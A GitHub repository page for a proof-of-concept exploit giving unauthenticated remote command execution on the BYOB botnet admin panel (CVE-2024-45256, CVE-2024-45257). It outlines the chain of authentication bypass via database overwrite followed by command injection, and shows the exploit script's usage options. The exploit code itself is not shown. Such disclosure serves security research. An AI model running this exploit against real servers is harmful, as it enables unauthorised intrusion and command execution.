| [database.db](/chebuya/exploits/blob/main/BYOB-RCE/database.db "database.db") | | [database.db](/chebuya/exploits/blob/main/BYOB-RCE/database.db "database.db") |  |  |
| [exploit.py](/chebuya/exploits/blob/main/BYOB-RCE/exploit.py "exploit.py") | | [exploit.py](/chebuya/exploits/blob/main/BYOB-RCE/exploit.py "exploit.py") |  |  |
| View all files | | |

## [README.md](#readme)

### BYOB (Build Your Own Botnet) Unauthenticated RCE (CVE-2024-45256, CVE-2024-45257)

This exploit works by spoofing an agent exfiltrating a file (CVE-2024-45257) to overwrite the sqlite database and bypass authentication. After authentication is bypassed, a command injection vulnerability is exploited in the payload builder page.

Full analysis: <https://blog.chebuya.com/posts/unauthenticated-remote-command-execution-on-byob/>

poc.mp4

```
python3 exploit.py -h
usage: exploit.py [-h] -t TARGET [-u USERNAME] [-p PASSWORD] [-A USER_AGENT] -c COMMAND

options:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        The target URL of the BYOB admin panel
  -u USERNAME, --username USERNAME
                        The username to set for the new admin account
  -p PASSWORD, --password PASSWORD
                        The password to set for the new admin account
  -A USER_AGENT, --user-agent USER_AGENT
                        The user-agent to use for requests
  -c COMMAND, --command COMMAND
                        The command to execute on the BYOB server

```

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


